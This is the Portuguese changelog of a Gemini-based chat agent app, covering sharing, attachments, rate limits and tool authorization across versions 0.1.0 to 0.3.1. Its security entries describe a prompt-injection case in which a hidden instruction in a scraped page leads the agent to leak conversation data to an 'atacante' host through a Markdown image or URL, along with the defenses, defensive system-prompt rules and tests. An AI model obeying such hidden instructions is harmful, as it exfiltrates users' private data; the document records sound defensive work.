# Changelog

Todas as mudanças relevantes deste projeto são registradas neste arquivo.

O formato segue o [Keep a Changelog](https://keepachangelog.com/pt-BR/1.1.0/)
e o projeto adota o [Versionamento Semântico](https://semver.org/lang/pt-BR/).

## [Unreleased]

## [0.3.1] - 2026-10-02

Correções da revisão de código da 0.3.0: pedido de autorização, rascunho com anexos, endereços
terminados em fechamento, armazenamento do site bloqueado e o limite de rodadas de tools.

### Fixed

- O pedido de autorização de tool não volta mais à tela, com os botões ativos, entre o fim do
  turno da decisão e a releitura do histórico. Um segundo clique nessa janela reenviava a decisão
  e mostrava "Esta conversa não tem um pedido de autorização em aberto." abaixo de uma resposta
  bem-sucedida.
- A lista de anexos pendentes que chega atrasada da API não devolve mais ao rascunho um anexo já
  enviado ou removido. Antes, o anexo voltava à tela, o envio seguinte falhava e ele só saía ao
  recarregar a página. Um anexo cujo upload terminava nessa mesma janela também não aparece mais
  duas vezes.
- O `web_scrape` não pede mais autorização para abrir um endereço enviado pelo usuário que termina
  em `)`, `]` ou `}`, como `https://pt.wikipedia.org/wiki/Terra_(planeta)`. O fechamento era
  tratado como pontuação da frase e o endereço nunca era reconhecido como fornecido pelo usuário.
- O app abre e funciona com o armazenamento do site bloqueado no navegador. O rascunho lia o
  `sessionStorage` sem proteção ao carregar e a tela ficava em branco; com o armazenamento cheio,
  digitar lançava erro. Nos dois casos o texto do rascunho agora fica só na memória e some ao
  recarregar a página.
- O texto que o agente escreve na resposta que passa de `MAX_TOOL_ROUNDS` agora é gravado. Antes,
  o usuário via o texto chegar e ele sumia quando o turno terminava com "O agente usou tools
  demais"; também não entrava no contexto do turno seguinte. As chamadas de tool dessa resposta
  continuam descartadas.
- Depois de um turno que usou tools e terminou com erro ou com compactação, a tela não repete
  mais, abaixo do histórico, as linhas "O assistente usou a ferramenta" que ele já mostra.

### Changed

- `docs/testes.md` com a contagem atual (614 testes) e `docs/planos-e-decisoes.md` com a revisão
  de código feita depois de fechar a 0.3.0, as correções dela e o estado das versões 0.3.0 e
  0.3.1.
- README lista o limite de rodadas entre o que os specs e2e cobrem, e o comentário de
  `maxToolRounds` diz que o texto da resposta que passa do limite é gravado.
- O LLM roteirizado do e2e escreve "Passo N: ..." junto com a tool pedida por conteúdo externo,
  como os modelos fazem, e o e2e roda com `MAX_TOOL_ROUNDS=3`, para o spec do limite de rodadas.

## [0.3.0] - 2026-10-01

Compartilhamento de conversa por link, histórico em páginas, reenviar e editar a última mensagem,
rascunho preservado, limites de anexos pendentes, imagens reduzidas no upload, defesas contra
prompt injection com autorização do usuário para tools, e o backend reorganizado em `kernel`,
`infra` e `http`.

### Added

#### Compartilhamento

- Compartilhamento de conversa por link somente leitura. O dono gera o link (token aleatório de
  32 caracteres, um por conversa), consulta e revoga em `/api/conversations/:id/share` (`PUT`,
  `GET` e `DELETE`). Qualquer usuário logado abre a conversa em `/api/shared/:token`, sem os
  resultados de tools. Gerar, revogar e abrir o link vão para a auditoria (`conversation.shared`,
  `conversation.share_revoked`, `conversation.share_viewed`).
- Anexos de conversa compartilhada em `/api/shared/:token/attachments/:id`, só para anexos
  enviados em mensagens daquela conversa e sem cache, para sumirem assim que o link é revogado.
- Botão "Compartilhar" em cada conversa: gera, copia e revoga o link. O link abre uma página
  somente leitura, com as mensagens e os anexos e sem campo de mensagem. Quem não está logado
  passa pelo login e volta ao link.
- Spec e2e do compartilhamento: outro usuário vê a conversa e a imagem sem poder enviar
  mensagens, o link revogado para de funcionar, quem não está logado volta ao link depois do login
  e a auditoria registra quem abriu.

#### Histórico e mensagens

- Histórico em páginas na API: `GET /api/conversations/:id` e `GET /api/shared/:token` devolvem
  as 50 mensagens mais recentes e `hasEarlierMessages`; `?before=<sequência>` traz as anteriores
  (`?limit=` até 100). Antes, abrir uma conversa trazia todas as mensagens, sem limite. No link
  compartilhado, a auditoria registra a abertura, não cada página.
- Tela do chat e do link compartilhado abrem pelas mensagens mais recentes e mostram o botão
  "Carregar mensagens anteriores" enquanto houver mais; a posição de leitura é mantida ao carregar.
  Coberto pelo spec e2e `history.spec.ts`.
- Refazer o último turno: `POST /api/conversations/:id/messages/last/resend` apaga a resposta à
  última mensagem do usuário e gera outra, em stream. Com `text`, edita a mensagem antes, mantendo
  os anexos dela. A resposta anterior é substituída, não guardada; valem o rate limit, o crédito e
  a reserva de turno do envio normal, e a auditoria registra `message.resent`.
- Botões "Editar" e "Reenviar" na última mensagem do usuário. Reenviar gera outra resposta para
  a mesma pergunta; editar troca o texto (os anexos continuam) e gera a resposta de novo. A
  resposta anterior é substituída. Coberto pelo spec e2e `resend.spec.ts`.

#### Anexos

- Anexos pendentes na API: `GET /api/conversations/:id/attachments/pending` lista o que já subiu
  e ainda não foi enviado em uma mensagem, e `DELETE /api/attachments/:id` remove um deles,
  apagando o registro e o arquivo no armazenamento (`attachment.removed` na auditoria). Anexo já
  enviado responde 409.
- Limite de 10 anexos por enviar em cada conversa, o mesmo de uma mensagem
  (`MAX_ATTACHMENTS_PER_MESSAGE`). A API recusa o upload seguinte com 429
  (`too_many_pending_attachments`), para que arquivos nunca enviados não se acumulem no
  armazenamento. Na tela, o botão de anexar fica desabilitado ao chegar no limite, os arquivos
  escolhidos além dele não sobem e o usuário é avisado de quantos ficaram de fora. Antes, o
  rascunho aceitava mais anexos do que a mensagem podia levar.
- O envio de vários arquivos para ao bater num limite (rate limit ou anexos por enviar), em vez de
  tentar os arquivos seguintes, que seriam recusados do mesmo jeito.
- Teto por usuário para os anexos ainda não enviados em mensagem, somando todas as conversas
  (`MAX_PENDING_ATTACHMENTS_MB`, padrão 500 MB). O upload que passaria do teto é recusado com 429
  (`pending_attachments_quota_exceeded`); enviar ou remover anexos libera o espaço. Fecha o caminho
  de acumular arquivos sem gastar crédito, criando várias conversas com anexos nunca enviados.
  Anexos já enviados continuam sem teto de armazenamento, limitados só pelo cap de crédito.
- Os tetos de anexos pendentes passam a valer também para uploads simultâneos: conferir e criar o
  anexo acontecem numa só transação, com a linha do usuário travada. Antes, uploads disparados em
  paralelo direto na API liam a mesma soma e passavam juntos do limite. O arquivo recusado é
  apagado do armazenamento.
- Um upload por vez por usuário em cada instância da API. O segundo upload simultâneo é recusado
  com 429 (`upload_in_progress`) antes de o arquivo ser lido, e o usuário vê que já há um envio em
  andamento. Protege a memória da instância contra uploads paralelos de uma mesma conta. Na tela,
  os uploads entram numa fila única do app: anexar outro arquivo enquanto o anterior sobe, na
  mesma conversa ou em outra, só espera a vez. O aviso fica para uploads feitos em outra aba ou
  direto na API.
- Testes unitários do adapter do Cloud Storage (`GcsFileStorage`), com um dublê do cliente em
  memória: gravação, leitura, endereço `gs://` e exclusão da pasta de uma conversa sem tocar nas
  vizinhas.

#### Agente e interface

- Limite de tools executando ao mesmo tempo numa rodada (`MAX_PARALLEL_TOOL_CALLS`, padrão 3). O
  modelo pode pedir várias leituras de página de uma vez, e cada uma ocupa memória enquanto é
  processada; as que passam do limite esperam a vez, sem falhar.
- Aviso do navegador ao fechar ou recarregar a aba enquanto alguma resposta ainda está chegando,
  já que sair corta o stream. Sem resposta em andamento, a aba fecha sem aviso.

#### Documentação

- README: seção sobre o compartilhamento, com o acesso restrito a usuários logados, a revogação e
  por que a colaboração ficou para depois.
- README: seção de testes, com o número de arquivos de teste e de specs e2e e o que os specs
  cobrem.
- `docs/testes.md`: como rodar a suíte Vitest, os quatro projetos, o que cada camada testa, os
  dublês, os testes de integração, a cobertura mínima e as convenções. O README aponta para ele.
- `docs/planos-e-decisoes.md`: estado das versões, pendências em ordem e as decisões de engenharia
  e de produto com seus motivos. Antes ficava fora do repositório. O README aponta para ele.
- README: seção "Do POC à produção", com os limites de dimensionamento atuais (anexos em memória,
  vagas do Cloud Run, conexões do banco, reserva de turno, auditoria síncrona, retenção e cota do
  Gemini), quando cada um aparece e a correção. Substitui a nota sobre uploads, que atribuía ao
  rate limit um teto que ele não impõe.
- Plano e decisões: limites de anexos pendentes, a escolha da janela fixa no rate limit, o aviso
  ao fechar a aba e, em aberto para produto, o teto de armazenamento do histórico.
- README: seção de limites com a janela fixa do rate limit, os tetos de anexos e o aviso ao
  fechar a aba.

### Fixed

- O rascunho da mensagem (texto e anexos ainda não enviados) continua como o usuário deixou quando
  ele abre outra conversa e volta, e também depois de recarregar a página. Antes ele sumia da
  tela, e o arquivo já anexado ficava de fora da mensagem enviada depois. O texto fica no
  `sessionStorage` da aba e os anexos são relidos da API.
- O botão "Remover" de um anexo ainda não enviado apaga o arquivo no armazenamento. Antes só o
  tirava da lista da tela, e o arquivo ficava guardado.
- Apagar uma conversa agora apaga também os arquivos dela no armazenamento (Cloud Storage ou
  disco). Antes só os registros dos anexos saíam do banco, e os arquivos ficavam guardados para
  sempre sem nada que apontasse para eles. O módulo de arquivos reage ao evento
  `conversation.deleted` e remove a pasta da conversa.
- O limite de rodadas de tool por turno (`MAX_TOOL_ROUNDS`) deixava passar uma rodada a mais: as
  tools pedidas depois do limite eram executadas e registradas, e só então o turno era
  interrompido, sem que o modelo lesse o resultado. Agora o turno para antes de executá-las.

### Changed

- Imagens com mais de 2048 px no maior lado são reduzidas no upload, mantendo a proporção e o
  formato; a rotação do EXIF é aplicada antes. O original não é guardado: a imagem reduzida é a
  que a tela mostra e a que o modelo lê a cada turno. Imagens menores ficam como vieram, e as já
  enviadas não mudam. Uma imagem que não dá para ler agora é recusada no upload (`invalid_image`).
  Nova dependência da API: `sharp`.
- Clicar na imagem de uma mensagem a amplia sobre o chat, em vez de abrir outra aba. O overlay
  fecha no botão, com Esc ou clicando fora da imagem, e mantém o link "Abrir em nova aba". Vale
  também na conversa aberta por link de compartilhamento.
- Documentação, comentários e testes passam a chamar a plataforma do Google Cloud pelo nome atual,
  Agent Platform (antes Vertex AI). A opção `vertexai` do SDK mantém o nome antigo.
- README deixa de citar conectores e MCP entre os recursos, porque ainda não foram entregues.
- O agente carrega do banco só as mensagens que o resumo da conversa ainda não cobre. Antes,
  cada chamada ao LLM (até nove por turno, com tools) trazia e validava o histórico inteiro, que
  cresce sem limite, para depois descartar em memória a parte já resumida.
- `RecordingEventPublisher`, usado só pelos testes, saiu de `shared/events` e foi para
  `apps/api/src/test`, junto dos outros apoios de teste.
- O que é entrada HTTP (`web-app`, `error-handler`, `health-router`, `event-stream` e a política
  de CSP) saiu de `shared/http` para `apps/api/src/http`: são adaptadores, não um kernel
  compartilhado entre os módulos.
- Banco (Prisma), leitura do ambiente, logger e barramento de eventos em processo saíram de
  `shared` para `apps/api/src/infra`: são infraestrutura, não código usado pelo domínio.
- `mapWithConcurrency`, usado só pelo agente, saiu de `shared/concurrency` para
  `modules/agent/application`.
- O que sobrou de `shared` no backend (`AppError`, `DomainEvent` e `Clock`, tipos puros que o domínio
  de cada módulo pode importar) passou a se chamar `apps/api/src/kernel`. O nome deixa claro que a
  pasta é um kernel compartilhado pequeno e não um depósito de utilitários.
- README descreve as pastas `kernel/`, `infra/` e `http/` de `apps/api/src`, e `docs/testes.md` tem
  as contagens de arquivos de teste atualizadas.
- Comentários do código revisados para a versão: `lastContextTokens` descrito como entrada mais
  saída da última chamada, o repositório de conversas e a página do histórico descritos como o
  código faz, a instrução de como adicionar uma tool apontando para `defineTool` e o
  `BuiltInToolProvider`, as tabelas e fontes de conectores e MCP marcadas como reservadas para a
  fase 3, e o `docker-compose.yml` dizendo que os testes de integração criam o próprio banco.
  `docs/testes.md` com as contagens atuais (95 arquivos, 607 testes).

### Security

- Imagens em Markdown na resposta do assistente aparecem como link e não são mais carregadas. O
  navegador busca uma imagem sozinho, sem clique: uma instrução escondida numa página lida pelo
  agente podia pedir a resposta `![](https://atacante/?d=<dados da conversa>)` e receber os dados
  na requisição. Coberto pelo spec e2e `prompt-injection.spec.ts`.
- Política de segurança de conteúdo (CSP) nas páginas do site: imagens, scripts, estilos e
  requisições só da própria origem, sem `object` e sem a página dentro de frames. É a segunda
  barreira contra o vazamento por conteúdo externo na tela: mesmo que ele chegue a ser renderizado,
  o navegador não faz a requisição para fora.
- Tools passam a dizer quais chamadas dependem da autorização do usuário (`requiresApproval`),
  olhando os argumentos de cada chamada. O registro de tools repassa a pergunta ao agente. É a base
  para que ações que mudam algo fora da conversa, ou que podem levar dados dela a terceiros, não
  sejam disparadas só por uma instrução escondida em conteúdo externo.
- Autorização do usuário para chamadas de tool. Quando o LLM pede uma tool que depende dela, o
  turno grava o pedido, avisa pelo evento de stream `approval_required` e para, sem executar
  nenhuma tool da rodada. `POST /api/conversations/:id/tool-approvals` recebe a decisão e retoma o
  turno: as chamadas autorizadas executam e as negadas voltam ao LLM como recusa. O estado da
  espera é o próprio histórico, então vale entre instâncias e depois de recarregar a página. Se o
  usuário enviar outra mensagem sem decidir, as chamadas são fechadas como não executadas. Pedido
  e decisão vão para a auditoria (`tool.approval_requested`, `tool.approval_decided`).
- Pedido de autorização na tela do chat: quando o turno para à espera do usuário, a conversa
  mostra a ferramenta e os argumentos inteiros da chamada, com "Permitir" e "Negar". O pedido vem
  do histórico, então continua na tela depois de recarregar a página; enviar outra mensagem o
  dispensa.
- `web_scrape` só lê sem perguntar os endereços que o usuário escreveu na conversa ou que vieram
  nas fontes da busca. Um endereço montado pelo modelo espera a autorização do usuário, que vê o
  endereço inteiro. Fecha o vazamento em que uma instrução escondida numa página fazia o agente
  ler `https://atacante/?d=<dados da conversa>`. O texto da resposta da busca e o conteúdo de
  páginas lidas não contam como fonte de endereços.
- System prompt: ações negadas pelo usuário não devem ser repetidas nem tentadas por outro caminho.
- O LLM falso dos testes obedece a um comando `/tool` que venha no resultado de uma tool, como um
  modelo enganado. O spec e2e `prompt-injection.spec.ts` usa isso para provar que a defesa vale
  mesmo quando a injeção funciona: o pedido aparece, negar não envia nada, permitir executa, o
  pedido sobrevive a recarregar a página e tudo vai para a auditoria.
- README: seção "Prompt injection", com as duas camadas de defesa (diminuir a chance de o modelo
  obedecer e limitar o dano quando ele obedece) e os limites conhecidos: anexos sem marca de
  externo, resumo da compactação, links clicáveis, resposta manipulada, busca e fadiga de
  autorização. Antes, o README dava o tema como coberto por um spec `@live`. Plano e decisões
  registram a revisão e por que a autorização encerra o turno em vez de segurar a conexão.
- Anexos chegam ao modelo marcados como material a analisar: cada imagem ou PDF vai precedido de
  um aviso de que instruções dentro do arquivo não são do usuário, e o system prompt diz que as
  instruções vêm só do texto digitado. O usuário ainda pode pedir, no texto dele, que o modelo siga
  o que está no arquivo. O resumo da compactação entra no system prompt rotulado como registro,
  não como instrução, e a compactação é orientada a não copiar ordens vindas de anexos e de tools.
- Spec `@live` da página lida pela tool usa outro nome público que resolve para 127.0.0.1
  (`receitas.fbi.com`). O Gemini passou a reconhecer `localtest.me` como endereço local e, em
  parte das execuções, recusava a leitura antes de chamar a tool.
- Spec `@live` com um PDF que traz uma instrução para o assistente abaixo do conteúdo
  (`receita-com-instrucao.pdf`): o modelo responde sobre o conteúdo e não obedece.
- README e decisões: anexos e resumo saem dos limites conhecidos como "sem marcação" e entram como
  defesa probabilística, com o que o spec `@live` mede e o que não mede.

## [0.2.0] - 2026-09-30

Guardrails do agente, limites de uso, ajustes de desempenho para vários usuários e leitura da
resposta sem rolagem automática.

### Added

#### Guardrails

- Resposta bloqueada pelo modelo por política de segurança ou cortada pelo limite de saída: o
  texto já transmitido é guardado, tools pedidas pela metade são descartadas e o usuário recebe o
  motivo (`response_blocked`, `response_truncated`), registrado na auditoria. O LLM falso ganha o
  comando `/blocked`.
- System prompt com a identidade do modelo configurado (o modelo não sabe a própria versão e se
  apresentava como uma anterior) e regras de comportamento: não inventar, recusar pedidos danosos,
  não revelar instruções e tratar conteúdo trazido por tools como dado, nunca como instrução.
- Conteúdo de terceiros marcado como externo: tools declaram `returnsExternalContent` e o registro
  entrega o resultado delas ao LLM com um aviso de que é dado não verificado, como defesa contra
  prompt injection. `web_search` e `web_scrape` são marcadas.
- Consumo e auditoria registram a versão do modelo que o Vertex AI informa ter usado
  (`modelVersion`), com o nome configurado como alternativa.

#### Limites de uso

- Turnos simultâneos limitados: uma resposta por conversa e até `MAX_CONCURRENT_TURNS_PER_USER`
  (padrão 3) por usuário, com reserva atômica no Postgres (`active_turns`) válida entre instâncias.
  Uma nova mensagem fora do limite recebe 409 antes do stream. Evita respostas intercaladas no
  histórico e fecha a brecha em que turnos paralelos passavam juntos pela conferência de crédito.
- Rate limit por usuário (módulo `rate-limiting`): envio de mensagens (20/min) e uploads (30/min),
  configuráveis por `RATE_LIMIT_MESSAGES_PER_MINUTE` e `RATE_LIMIT_UPLOADS_PER_MINUTE`. Contadores
  por janela fixa no Postgres (`rate_limit_windows`), válidos entre instâncias; acima do limite a
  API responde 429 com `Retry-After`, e a primeira recusa de cada janela vai para a auditoria
  (`rate_limit.exceeded`). O upload é recusado antes de o arquivo ser recebido.

#### Desempenho

- Nova tentativa automática quando o Vertex AI responde 429, 500 ou 503: até três novas tentativas
  com espera crescente e variação aleatória, só na abertura da chamada (antes de qualquer texto
  chegar) e interrompidas se o cliente desconectar. Vale para o chat e para a busca na web.
- Pool de conexões ao banco com tamanho explícito (`DATABASE_POOL_MAX`, padrão 5 por instância),
  para caber no limite de conexões do Cloud SQL `db-f1-micro` com duas instâncias e a migração.

#### Interface

- Leitura da resposta mais calma: o texto em stream aparece aos poucos, em ritmo que acompanha o
  atraso do stream, em vez de surgir em blocos; a tela não rola sozinha enquanto a resposta chega
  (só ao abrir a conversa e ao enviar a pergunta), e um botão "Mais conteúdo abaixo" aparece quando
  há conteúdo fora da área visível. Com `prefers-reduced-motion`, o texto aparece de uma vez.

#### Testes

- Teste ponta a ponta de resposta bloqueada: mensagem de motivo, histórico sem resposta vazia e
  falha registrada na auditoria.
- Testes `@live` contra o Gemini real (`GCP_PROJECT_ID=... npm run e2e:live`): leitura de PDF e
  imagem, identidade do modelo e resistência a instruções escondidas numa página lida pela tool.
  Antes, o script filtrava os specs `@live` mas mantinha o LLM roteirizado.
- LLM falso ganha o comando `/slow`, que responde em cerca de 4 segundos, para testar respostas
  em andamento.
- Teste ponta a ponta de resposta que continua chegando enquanto o usuário usa outra conversa.
- Testes ponta a ponta dos limites de uso: aviso de rate limit com registro na auditoria e recusa
  de uma segunda mensagem enquanto a conversa ainda responde.
- Teste de carga (`npm run load-test`): sobe a API com o LLM falso e mede o tempo de resposta com
  1, 5 e 20 usuários simultâneos. Localmente os três cenários ficam em cerca de 3,7 s, a própria
  duração da resposta simulada.
- Teste ponta a ponta da leitura: a posição da tela se mantém enquanto a resposta chega e o
  indicador de conteúdo abaixo leva ao fim da conversa.

#### Documentação

- README com as seções "Limites e proteções" e "Desempenho", e o deploy atualizado com o fluxo
  contínuo e o job de migração.

### Changed

- Actions do CI atualizadas para versões que rodam em Node 24 (a execução em Node 20 foi
  descontinuada nos runners do GitHub).
- Página local servida aos specs de scraping movida para `e2e/support/local-page.ts`, para
  reuso entre specs.
- Compactação mais cedo: `CONTEXT_TOKEN_LIMIT` passa de 1 milhão (a janela do modelo) para 100
  mil tokens. Cada mensagem reenvia o contexto inteiro; com o orçamento menor, um turno custa no
  máximo cerca de 80 mil tokens de entrada, em vez de 800 mil.
- Limite padrão de tokens por usuário reduzido de 2 milhões para 500 mil, vitalício. Uma migração
  leva as contas que ainda estavam no padrão antigo para o novo; limites ajustados por um
  administrador são mantidos.
- Migrações do banco saem da inicialização do contêiner: o deploy roda o Cloud Run Job
  `chat-tess-migrate` com a imagem nova antes de publicar a revisão, e uma migração que falha
  interrompe o deploy. A inicialização fica mais curta, o que reduz o cold start.
  `infra/setup-github-deploy.sh` cria o job e aplica as migrações pendentes.

### Fixed

- Respostas continuam chegando ao trocar de conversa: o estado dos turnos saiu do componente do
  chat para um store do app (`active-turns-store`). Só o botão "Parar" e o fechamento da aba
  encerram a resposta, e a barra lateral indica as conversas que estão respondendo. Antes, abrir
  outra conversa cortava a resposta em andamento.

## [0.1.0] - 2026-09-30

Primeira versão em produção: fases 1 e 2 do desafio e deploy contínuo.

### Added

#### Base e arquitetura

- Monorepo com npm workspaces (`apps/*`, `packages/*`, `e2e`), TypeScript estrito e Prettier.
- Pacote `@chat-tess/shared` com o formato neutro de mensagem (`MessagePart`) e os eventos de
  stream SSE (`StreamEvent`), validados com Zod.
- ESLint com regra de camadas da arquitetura hexagonal: `domain/` e `application/` não podem
  importar `infra/`, `http/`, frameworks nem SDKs.
- Workspace `@chat-tess/api` com Express 5, build via tsup e execução em desenvolvimento via tsx.
- Configuração tipada da API (`loadConfig`): variáveis de ambiente validadas com Zod em um único
  ponto, com erro que lista todas as variáveis inválidas.
- Event bus em processo (`InProcessEventBus`) para eventos de domínio; a falha de um handler não
  interrompe os demais nem quem publicou o evento.
- Logger estruturado (pino) no formato do Cloud Logging, com cookies e tokens ocultados.
- Servidor HTTP com `GET /api/health`, tratamento central de erros (`AppError` e Zod traduzidos
  para status HTTP) e entrega do build do frontend com fallback para o `index.html`.
- Composition root (`composition-root.ts`) como único ponto de montagem das dependências.
- Modelo de dados com Prisma e migração inicial: usuários, lista de permitidos, conversas,
  mensagens, anexos, resumos de compactação, tools, consumo, créditos, auditoria, conectores e MCP.
- Conexão com o Postgres e `GET /api/health/ready`, que responde 503 e aponta a dependência
  indisponível quando o banco não responde.
- Workspace `@chat-tess/web` com React, Vite e Tailwind; página inicial mostra o estado da API.
  Em desenvolvimento o Vite repassa `/api` para a API.

#### Autenticação e usuários

- Regra da lista de permitidos: aceita e-mail completo ou domínio (`@empresa.com`), ignorando
  maiúsculas e espaços.
- Use case `SignIn`: aplica a lista de permitidos, cria o usuário no primeiro acesso, abre a sessão
  e publica os eventos `auth.login_succeeded` e `auth.login_denied`.
- Use case `GetCurrentUser`: identifica o usuário a partir do token de sessão.
- Use case `SeedAllowedEmails`: carrega na inicialização os padrões vindos da configuração, sem
  remover os já cadastrados.
- Configuração de sessão e login: `SESSION_SECRET`, `AUTH_MODE` (`google` ou `test`, este
  proibido em produção), credenciais do OAuth, `PUBLIC_BASE_URL` e `ALLOWED_EMAILS`.
- Dependências de autenticação: `jose` (JWT), `google-auth-library` (OAuth) e `cookie-parser`.
- Sessão sem estado com JWT (`JwtSessionTokens`), com expiração configurável.
- Login com Google (`GoogleIdentityProvider`): fluxo de código de autorização trocado no
  servidor, aceitando apenas contas com e-mail verificado.
- Repositórios Prisma de usuários e da lista de permitidos.
- Contratos de autenticação no pacote compartilhado: usuário atual, login de teste e motivos de
  falha de login.
- Rotas de autenticação: `GET /api/auth/me`, `POST /api/auth/logout`, login com Google
  (`/api/auth/google` e `/callback`, com `state` contra CSRF) e `POST /api/auth/test-login`,
  disponível só no modo `test`.
- Sessão em cookie `HttpOnly` e middleware `requireAuthentication` para rotas protegidas.
- Módulo de autenticação montado na aplicação (`createAuthModule`); a lista de permitidos da
  configuração é carregada antes de a API aceitar requisições.
- Tela de login com Google, com mensagem para cada motivo de falha, cabeçalho com o usuário
  logado e botão de sair.
- Papel de administrador definido por `ADMIN_EMAILS` e reaplicado a cada login: quem sai da lista
  volta a ser usuário comum. Middleware `requireAdmin` para rotas administrativas.

#### Conversas

- Domínio de conversas: conversa, mensagem ordenada por sequência e título gerado a partir da
  primeira mensagem.
- Use cases de conversa: criar, listar, abrir com histórico, renomear e apagar, sempre restritos
  ao dono. A conversa de outro usuário responde como inexistente.
- Repositórios Prisma de conversas e mensagens. A gravação trava a conversa para que mensagens
  simultâneas não repitam a sequência.
- Contratos de conversa no pacote compartilhado: resumo, detalhe com mensagens e requisições de
  criação e renomeação.
- Rotas de conversa (`/api/conversations`): listar, criar, abrir com histórico, renomear e apagar,
  todas autenticadas.

#### Agente e compactação

- Domínio do agente: port `LlmProvider` independente de provedor, ports de tools e anexos,
  memória da conversa (resumos) e política de compactação, que só corta o histórico no início de
  um turno para nunca separar uma chamada de tool do resultado.
- Compactação automática do histórico (`CompactConversation`): resume as mensagens antigas com o
  LLM, mantém as recentes intactas, acumula resumos anteriores e preserva as mensagens originais.
- Use case `RunAgentTurn`: grava a mensagem, gera a resposta em stream, executa tools em loop
  com limite de rodadas, compacta antes de estourar o contexto e, se o modelo recusar por excesso
  de contexto, compacta e tenta de novo sem interromper o chat.
- Adapter do Gemini no Vertex AI (`GeminiLlmProvider`): streaming, anexos por URI do Cloud Storage
  ou conteúdo embutido, chamadas de função com a `thoughtSignature` preservada entre turnos,
  consumo somando os tokens de raciocínio e tradução do estouro de contexto.
- Memória da conversa no Postgres (`PrismaConversationMemory`): resumos de compactação e tamanho
  do contexto da última chamada.
- Configuração do LLM, do agente e dos anexos: `LLM_MODE` (`gemini` ou `fake`, este proibido em
  produção), modelo e projeto do Vertex AI, limite de contexto e limiar de compactação, limite de
  rodadas de tool, armazenamento (`local` ou `gcs`) e tamanho máximo de upload.
- `POST /api/conversations/:id/messages`: envia a mensagem e devolve a resposta do agente em
  Server-Sent Events, com heartbeat e cancelamento quando o cliente desconecta.
- Agente, anexos e tools montados na aplicação. Validado com o Gemini real: upload de PDF, resposta
  em stream baseada no conteúdo do arquivo e pergunta seguinte usando o histórico.

#### Anexos

- Domínio de anexos: tipo detectado pelos primeiros bytes do conteúdo (PDF, PNG, JPEG e WEBP), e
  não pelo nome ou tipo declarado, e nome de arquivo higienizado.
- Use cases de anexos: upload com limite de tamanho, leitura restrita ao dono e catálogo que o
  agente usa para validar anexos pendentes e enviá-los ao LLM, por endereço ou embutidos.
- Armazenamento de arquivos em disco local (desenvolvimento) e no Cloud Storage (produção, lido
  pelo Vertex AI direto por `gs://`), e repositório Prisma de anexos.
- Rotas de anexos: `POST /api/conversations/:id/attachments` (multipart) e
  `GET /api/attachments/:id`, com `nosniff` e nome de arquivo codificado.

#### Tools

- Registro de tools (`ToolRegistry`, padrões Registry e Strategy): junta tools de várias fontes
  (nativas, conectores e MCP), converte falhas em resultados de erro para o LLM e publica cada
  execução com entrada, saída e duração.
- Leitura segura de páginas da web para as tools: só endereços públicos (bloqueia loopback, redes
  privadas, metadados do Google Cloud e IPv4 escrito em IPv6), validação do IP na conexão contra
  DNS rebinding, redirecionamentos revalidados e limites de tempo e tamanho.
- Busca na web com o grounding do Google Search no Gemini, numa chamada separada da conversa, e
  uma busca simulada para os testes ponta a ponta.
- Tools nativas `web_search` e `web_scrape`, definidas com `defineTool`: o mesmo schema Zod gera o
  JSON Schema enviado ao LLM e valida os argumentos. O consumo do LLM usado na busca entra na conta
  do usuário.
- Preferências de tools sem chave estrangeira para o catálogo, para aceitar tools de servidores MCP
  descobertas em tempo de execução; nova origem de tool `MCP`.
- Configuração de tools por usuário: `GET /api/tools` lista as tools com origem (nativa, conector
  ou MCP) e estado, e `PUT /api/tools/:nome` liga ou desliga. Tools desligadas não são oferecidas
  ao LLM nem executadas. Cada execução é gravada em `tool_calls` e o catálogo das tools nativas é
  sincronizado na inicialização.
- Painel "Ferramentas" no cabeçalho para ligar e desligar as tools do agente.

#### Créditos

- Port `UsageLimiter` no agente: o crédito é verificado antes de aceitar a mensagem, que não é
  gravada quando o usuário está sem saldo.
- Créditos: cada chamada ao LLM (chat e compactação) é registrada em `usage_records` e somada ao
  consumo do usuário; `CreditGuard` bloqueia novos turnos ao atingir o cap, com mensagem clara;
  administradores ajustam o limite de um usuário pelo e-mail.
- `GET /api/usage` (consumo, limite, saldo e chamadas recentes) e `PUT /api/admin/credit-limits`
  (só administradores); limite padrão por usuário em `DEFAULT_TOKEN_LIMIT`.
- Medidor de consumo de tokens no cabeçalho, atualizado ao fim de cada resposta.

#### Auditoria

- Auditoria: todo evento de domínio (login, conversas, mensagens, anexos, chamadas ao LLM,
  compactação, tools e falhas) é gravado em `audit_events` com o conteúdo compactado.
  `GET /api/audit-events` pagina a trilha; usuários veem só os próprios eventos e administradores
  veem todos.

#### Interface do chat

- Camada de API do frontend: conversas, anexos e envio de mensagem com leitura de Server-Sent
  Events por `fetch` (o `EventSource` do navegador só faz GET), validando cada evento com o contrato
  compartilhado.
- Interface do chat: lista de conversas com criar, renomear e apagar; conversa aberta na URL;
  respostas em stream com Markdown; anexos com prévia de imagem e link de PDF; indicação de tools
  em uso; aviso de compactação; botão para interromper a resposta.

#### Testes

- Vitest configurado na raiz com um projeto por workspace e cobertura via V8.
- Postgres local via `docker compose`, com banco separado (`chat_tess_test`) para testes.
- Testes ponta a ponta com Playwright (`npm run e2e`): a suíte sobe API e frontend em portas
  próprias, usa o banco `chat_tess_test` e grava trace e screenshot em caso de falha.
- Cobertura mínima de 80% exigida em `domain/` e `application/` dos módulos da API.
- Testes de integração contra Postgres real (`*.integration.test.ts`), em banco próprio criado
  automaticamente; o CI passa a subir o Postgres também no job de testes.
- Testes ponta a ponta do login: entrada permitida, sessão após recarregar, saída, e-mail
  barrado e mensagem de erro do Google.
- Convenção `*.test-support.ts` para código de apoio a testes, isento da regra de camadas e fora
  da cobertura.
- LLM roteirizado (`ScriptedLlmProvider`) e dublês em memória para testar o agente sem rede.
- LLM roteirizado para os testes ponta a ponta (`LLM_MODE=fake`): repete a mensagem, lista os
  anexos, resume no pedido de compactação e chama tools com o comando `/tool nome {json}`.
- Testes ponta a ponta do chat: enviar e receber, título automático, histórico após recarregar,
  alternar, renomear e apagar conversas; anexos de PDF e imagem, tipo não suportado; e compactação
  automática sem interromper o chat nem apagar mensagens. Cada teste usa um usuário próprio.
- Teste do registro de tools para falhas que não são instâncias de `Error`.
- Testes ponta a ponta da auditoria: fluxo completo registrado e isolamento entre usuários.
- Testes ponta a ponta dos créditos: medidor atualizado, bloqueio ao atingir o limite definido por
  um administrador e recusa de mudança de limite por usuário comum.
- Testes ponta a ponta das tools: busca na web, scraping de página local, tool desligada não
  executada, preferência persistida e execução registrada na auditoria.

#### Infraestrutura e deploy

- Dockerfile multi-stage: uma única imagem serve a API e o frontend, aplica as migrações pendentes
